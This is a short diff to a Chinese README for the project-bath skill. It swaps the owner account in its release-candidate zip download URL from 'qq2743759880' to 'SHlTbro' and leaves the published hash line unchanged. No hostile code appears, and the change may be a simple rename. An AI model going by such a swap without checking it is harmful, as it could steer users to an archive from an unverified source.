@@ -6,7 +6,7 @@
 be0f03a07a7be155e2e011d7029fb08dbad0b6557dc9993f4b7418f345007319
 ```
 
-[不可变 RC 下载](https://raw.githubusercontent.com/qq2743759880/project-bath/v0.2.0-rc1/distributions/project-bath-v0.2.0-rc1.zip) 绑定版本 tag。Stable `v0.1.3` 的 tag、Release 与安装入口保留。
+[不可变 RC 下载](https://raw.githubusercontent.com/SHlTbro/project-bath/v0.2.0-rc1/distributions/project-bath-v0.2.0-rc1.zip) 绑定版本 tag。Stable `v0.1.3` 的 tag、Release 与安装入口保留。
 
 Runtime / Redistribution：`SKILL.md`、`references/protocol.md`、`scripts/bath.ps1`、`references/LICENSE`。公开 Showcase：README、Hero、流程图、交互 HTML、typed JSON 与用户文档。构建代码、设计源、测试、receipt、编排日志保留在私有工程区，不属于这个 Skill 的安装包。
 
